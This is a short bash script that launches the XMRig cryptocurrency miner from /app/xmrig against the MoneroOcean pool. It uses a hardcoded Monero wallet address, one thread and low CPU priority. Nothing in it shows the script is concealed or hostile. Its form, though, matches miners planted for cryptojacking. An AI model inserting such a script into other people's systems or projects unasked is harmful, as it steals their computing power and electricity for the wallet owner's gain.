#!/bin/bash
cd /app/xmrig

./xmrig -o gulf.moneroocean.stream:10128 \
-u 4B1nkGS1TA75fiVqZymRbphi4UasPQZkY22jDRBd1aGCKZiszNGffThRV7T1jRtn5d3TTpUphYA6tdvWg1FtrkSVN7Gfzfm \
--coin monero -p x \
--threads=1 \
--cpu-priority=1 \
--donate-level=1
